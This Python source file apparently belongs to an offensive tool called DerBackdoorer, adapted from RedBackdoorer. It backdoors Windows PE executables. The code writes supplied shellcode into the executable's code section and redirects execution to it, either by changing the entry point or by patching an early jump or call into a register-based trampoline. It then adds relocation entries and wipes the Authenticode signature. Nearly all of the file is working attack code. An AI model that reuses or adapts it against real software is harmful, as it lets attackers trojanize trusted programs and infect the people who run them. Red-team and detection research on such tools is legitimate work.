#!/usr/bin/python3
#
# Based on the original RedBackdoorer by Mariusz Banach
#

import random
import textwrap
import pefile
import capstone
import keystone
from enum import IntEnum
import logging

from helper import hexdump
from pe.superpe import SuperPe
from model.defs import *

logger = logging.getLogger("DerBackdoorer")


class PeBackdoor:
    def __init__(self, superpe: SuperPe, main_shc: bytes, inject_mode: InjectStyle):
        self.superpe: SuperPe = superpe
        self.runMode: InjectStyle = inject_mode
        self.shellcodeData: bytes = main_shc

        # Working
        self.shellcodeOffset: int  = 0    # from start of the file
        self.shellcodeOffsetRel: int = 0  # from start of the code section
        self.backdoorOffsetRel: int = 0   # from start of the code section
    

    def injectShellcode(self):
        sect = self.superpe.get_code_section()
        if sect == None:
            logger.error('Could not find code section in input PE file!')
            return False
        sect_name = sect.Name.decode().rstrip('\x00')
        sect_size = sect.Misc_VirtualSize  # Better than: SizeOfRawData
        logger.debug(f'Backdooring {sect_name} section.')

        if sect_size < len(self.shellcodeData):
            logger.critical(f'''Input shellcode is too large to fit into target PE executable code section!
Shellcode size    : {len(self.shellcodeData)}
Code section size : {sect_size}
''')

        offset = int((sect_size - len(self.shellcodeData)) / 2)
        logger.debug(f'Inserting shellcode into 0x{offset:x} offset.')

        self.superpe.pe.set_bytes_at_offset(offset, self.shellcodeData)
        self.shellcodeOffset = offset
        self.shellcodeOffsetRel = offset - sect.PointerToRawData

        rva = self.superpe.pe.get_rva_from_offset(offset)

        p = sect.PointerToRawData + sect.SizeOfRawData - 64
        graph = textwrap.indent(f'''
Beginning of {sect_name}:
{textwrap.indent(hexdump(self.superpe.pe.get_data(sect.VirtualAddress), sect.VirtualAddress, 64), "0")}

Injected shellcode in the middle of {sect_name}:
{hexdump(self.shellcodeData, offset, 64)}

Trailing {sect_name} bytes:
{hexdump(self.superpe.pe.get_data(self.superpe.pe.get_rva_from_offset(p)), p, 64)}
''', '\t')

        logger.info(f'Shellcode injected into existing code section at RVA 0x{rva:x}')
        logger.debug(graph)
        return True


    def setupShellcodeEntryPoint(self):
        if self.runMode == InjectStyle.ChangeEntryPoint:
            rva = self.superpe.pe.get_rva_from_offset(self.shellcodeOffset)
            self.superpe.set_entrypoint(rva)

            logger.info(f'Address Of Entry Point changed to: RVA 0x{rva:x}')
            return True

        elif self.runMode == InjectStyle.BackdoorCallInstr:
            return self.backdoorEntryPoint()

        #elif self.runMode == int(PeBackdoor.SupportedRunModes.HijackExport):
        #    addr = self.getExportEntryPoint()
        #    if addr == -1:
        #        logger.critical('Could not find any export entry point to hijack! Specify existing DLL Exported function with -e/--export!')
        #
        #    return self.backdoorEntryPoint(addr)

        return False
    
    
    def getExportEntryPoint(self):
        dec = lambda x: '???' if x is None else x.decode() 

        #exportName = self.options.get('export', '')
        exportName = ""
        if len(exportName) == 0:
            logger.critical('Export name not specified! Specify DLL Exported function name to hijack with -e/--export')

        d = [pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_EXPORT"]]
        self.superpe.pe.parse_data_directories(directories=d)

        if self.superpe.pe.DIRECTORY_ENTRY_EXPORT.symbols == 0:
            logger.error('No DLL exports found! Specify existing DLL Exported function with -e/--export!')
            return -1
        
        exports = [(e.ordinal, dec(e.name)) for e in self.superpe.pe.DIRECTORY_ENTRY_EXPORT.symbols]

        for export in exports:
            logger.debug(f'DLL Export: {export[0]} {export[1]}')
            if export[1].lower() == exportName.lower():

                addr = self.superpe.pe.DIRECTORY_ENTRY_EXPORT.symbols[export[0]].address
                logger.info(f'Found DLL Export "{exportName}" at RVA 0x{addr:x} . Attempting to hijack it...')
                return addr

        return -1
    

    def backdoorEntryPoint(self, addr = -1):
        imageBase = self.superpe.pe.OPTIONAL_HEADER.ImageBase
        self.shellcodeAddr = self.superpe.pe.get_rva_from_offset(self.shellcodeOffset) + imageBase

        cs = None
        ks = None

        if self.superpe.arch == 'x86':
            cs = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_32 + capstone.CS_MODE_LITTLE_ENDIAN)
            ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_32 + keystone.KS_MODE_LITTLE_ENDIAN)
        else:    
            cs = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64 + capstone.CS_MODE_LITTLE_ENDIAN)
            ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_64 + keystone.KS_MODE_LITTLE_ENDIAN)

        cs.detail = True

        ep = addr

        if addr == -1:
            ep = self.superpe.pe.OPTIONAL_HEADER.AddressOfEntryPoint

        ep_ava = ep + self.superpe.pe.OPTIONAL_HEADER.ImageBase
        data = self.superpe.pe.get_memory_mapped_image()[ep:ep+128]
        offset = 0

        logger.debug('Entry Point disasm:')

        disasmData = self.superpe.pe.get_memory_mapped_image()
        output = self.superpe.disasmBytes(cs, ks, disasmData, ep, 128, self.backdoorInstruction)

        # store offset... by calculating it first FUCK
        section = self.superpe.get_code_section()
        self.backdoorOffsetRel = output - section.VirtualAddress

        if output != 0:
            logger.debug('Now disasm looks like follows: ')

            disasmData = self.superpe.pe.get_memory_mapped_image()
            self.superpe.disasmBytes(cs, ks, disasmData, output - 32, 32, None, maxDepth = 3)

            logger.debug('\n[>] Inserted backdoor code: ')
            for instr in cs.disasm(bytes(self.compiledTrampoline), output):
                self.superpe.printInstr(instr, 1)

            logger.debug('')
            self.superpe.disasmBytes(cs, ks, disasmData, output + len(self.compiledTrampoline), 32, None, maxDepth = 3)

        else:
            logger.error('Did not find suitable candidate for Entry Point branch hijack!')

        return output
    

    def getBackdoorTrampoline(self, cs, ks, instr):
        trampoline = ''
        addrOffset = -1

        registers = ['rax', 'rbx', 'rcx', 'rdx', 'rsi', 'rdi']

        if self.superpe.arch == 'x86':
            registers = ['eax', 'ebx', 'ecx', 'edx', 'esi', 'edi'] 

        reg = random.choice(registers).upper()
        reg2 = random.choice(registers).upper()

        while reg2 == reg:
            reg2 = random.choice(registers).upper()

        enc, count = ks.asm(f'MOV {reg}, 0x{self.shellcodeAddr:x}')
        for instr2 in cs.disasm(bytes(enc), 0):
            addrOffset = len(instr2.bytes) - instr2.addr_size
            break

        found = instr.mnemonic.lower() in ['jmp', 'je', 'jz', 'jne', 'jnz', 'ja', 'jb', 'jae', 'jbe', 'jg', 'jl', 'jge', 'jle']
        found |= instr.mnemonic.lower() == 'call'

        if found:
            logger.info(f'Backdooring entry point {instr.mnemonic.upper()} instruction at 0x{instr.address:x} into:')

            jump = random.choice([
                f'CALL {reg}',

                #
                # During my tests I found that CALL reg works stabily all the time, whereas below two gadgets
                # are known to crash on seldom occassions.
                #

                #f'JMP {reg}',
                #f'PUSH {reg} ; RET',
            ])

            trampoline = f'MOV {reg}, 0x{self.shellcodeAddr:x} ; {jump}'

        for ins in trampoline.split(';'):
            logger.info(f'\t{ins.strip()}')

        logger.info('')

        return (trampoline, addrOffset)
    

    def backdoorInstruction(self, cs, ks, disasmData, startOffset, instr, operand, depth):
        encoding = b''
        count = 0

        if depth < 2: 
            return 0

        (trampoline, addrOffset) = self.getBackdoorTrampoline(cs, ks, instr)

        if len(trampoline) > 0:
            encoding, count = ks.asm(trampoline)
            self.superpe.pe.set_bytes_at_rva(instr.address, bytes(encoding))

            relocs = (
                instr.address + addrOffset,
            )

            pageRva = 4096 * int((instr.address + addrOffset) / 4096)
            self.superpe.addImageBaseRelocations(pageRva, relocs)

            self.trampoline = trampoline
            self.compiledTrampoline = encoding
            self.compiledTrampolineCount = count

            logger.info('Successfully backdoored entry point with jump/call to shellcode')
            return instr.address

        return 0


    def removeSignature(self):
        addr = self.superpe.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress
        size = self.superpe.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_SECURITY].Size

        self.superpe.pe.set_bytes_at_rva(addr, b'\x00' * size)

        self.superpe.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress = 0
        self.superpe.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_SECURITY].Size = 0

        logger.info('PE executable Authenticode signature removed.')
        return True